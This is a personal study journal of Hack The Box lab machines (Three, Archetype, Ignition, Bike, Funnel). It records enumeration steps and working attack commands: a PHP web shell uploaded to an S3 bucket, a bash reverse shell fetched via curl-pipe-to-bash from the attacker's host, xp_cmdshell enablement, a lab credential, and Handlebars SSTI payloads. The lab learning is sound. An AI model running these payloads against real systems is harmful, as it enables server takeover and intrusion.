
---
tags:
- #hacking
- #hackthebox
- #IT
---

### 12.01.2024

Finding subdomains:
-> For some reason wfuzz is running mad slow on my PC, same wordlist work very fast with gobuster. Also
wfuzz do not even get the correct respons?
-> gobuster example: 

```
gobuster vhost -w ../../wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://thetoppers.htb
```

also, when running gobuster, the -u [URL] needs to be after the -w [wordlist], its stupide, but the 
first one did not work for me. NOTE: Remember to use --append-domain.
Confidentiality Integrity Availability
### 13.01.2024
Working with AWS S3 buckets:
Apparently we can use the AWS CLI tool without having real credentials, 
sometimes they only check is there is a value there. I sett all of them to temp.

Lising the buckets we also need to spesify the endpoint, example:
```
aws --endpoint=http://s3.thetoppers.htb s3 ls

or:

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

  
### 14.01.2024
We have gained access to thetoppers.htb buckets, or the aws s3 service being hosted on the website.
I can see that there is nothing interessting information in it, but we we have the option to 
upload malicious files.

Getting a reverse shell:
```
<?php system($_GET["cmd"]); ?>
```

Uploading php shell file to the bucket. 
```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### 15-16.01.2024
Uploading a reverse shell to a Amazone S3 bucket:

From the .PHP script we build and uploaded yesterday we can execute commands via CMD on the server using:
```
http://thetoppers.htb/shell.php?cmd=[command]
```

Then we make a bash shell for us to get a reverse shell on the server(Why could we not just use the .php shell?). We the new shell creates a connection to our ip on port 1337.

```
#!/bin/bash

bash -i >& /dev/tcp/<IP>/1337 0>&1

```

-i: Launches interactive Bash shell.



And upload this new .sh shell to the server, we will be executing this via the .php shell. 

Setting up a http server running from my PC, in the directory i have saved the new .sh shell: 

```
python3 -m http.server 8000
```

This hosts a http service, listening for incoming connections on port 8000. When clients connect to the service when would gain access to all the file contained in the directory where the service is hosted. 

Then we set up a listener with netcat on the port we specified in the .sh script. (the -l specifies the listening mode)
```
nc -nvlp 1337
```


When executing this in the browser:
```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.233:8000/shell.sh|bash
```

we create execute the .sh shell and create a connection to our 1337 port, letting us execute code on their server from our terminal:

![[Pasted image 20240116201856.png]]
![[Pasted image 20240116201913.png]]


### 17.01.2024
Hacking Archetype: 
Finding SMB service on port 445. An SMB service allows systems of the same network to share files and printers over TCP/IP. 

Can see that the box uses port 139 to host a netbios service, using this to host SMB.

We can use smbclient to list shares the SMB service.:
```
smbclient -L server_name_or_ip_address
```

Also, we can connect to a given share by:
```
smbclient //10.129.245.78/backups
```

And using basic commands as cd, ls and get, to navigate and download the interesting files. 

We also have a SQL service on the box, and we want to create an Authenticated connection to it, we can use:
```
mssqlclient.py
```


### 18.01.2024
To use the mssqlclient.py script we need to install some python packages, but due to dependencies with apt and pip packages, we should use a venv and install pip packages inside the venv. 

```
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install -r requirements.txt

deactivate
```

Then we could use mssqlclient.py from the venv. We have some credentials from the config file we found on the SMB. We use them to connect:  

```
python3 mssqlclient.py ARCHTYPE/sql_svc:M3g4c0rp123@10.129.112.34 -windows-auth
```


### 19.01.2024

.venv laying inside the repos/impacket folder. Cannot access it without being in this folder. 

We would like to spawn a windows command shell from within the sql server. The extended stored procedure we need is: xp_cmdshell. 

Spawning this we use the commands:
```
Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```


### 20-21.01.2024

Hacking the ignition box. Wanting to check the http status code when we try connecting to the site:

```
curl -I -v http://10.129.76.89
```

Could not find anyting useful when exploring the landing page so we try to look for directories on the site with gobuster:

```
gobuster dir -w directory-list-2.3-big.txt -u http://ignition.htb
```

After we find a login page, we try to login as the admin. Optimally we would try to extract some credential information from fuzzing the site, but since there was nothing useful, we try brute forcing with some usual passwords. 

we know the password is required to be: min 7 chars,  including a number.

Trying some of them, we find admin: qwerty123  is correct.  

### 22 - 31.01.2024

Hacking "Bike".

We find a site which is vulnerable to **Server-Side Template Injection**:

Possible ways to identify vulnerability:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

If the SSTL exists, the website would detect the expressions over, and try to execute them as code

Can be similar to XSS, but we differentiate by using mathematical operators when testing SSTL.


SSTI occurs when user input is not properly sanitized or validated on the server side, and thus get executed as code within the context of a template engine. This vulnerability can occur when user input is concatenated directly into a template. This is for the note, a typical vulnerability for Node.js websites. 

Template engine being used: Handlebars.

Allows the site to define templates with placeholders, and then fill those placeholders with actual data during runtime.  

Looking for ways to exploit Handlebars SSTL we go to:https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs

And send the URL encoded version as the payload for the post parameter: email.

We meet an error, that is that the site do not accept the require() statement in our payload.  Doing some digging we find out that we can use:

```
{{this.push "return process.mainModule.require('child_process');"}}
```
instead of: 
```
{{this.push "return process;"}}
```

This lets us execute code on server side, so doing some basic cat, ls, whoami commands, we find recognize are ourselfs as root user, and find the content of flag.txt.  

### 31.01.2024
Hacking  htb Funnel.

After we scan we find a ftp service and a SSH. Start with connecting to the ftp:
```
ftp ftp://10.129.228.195:21
```

We find some file with some mails, and a mail explaining the password policy.


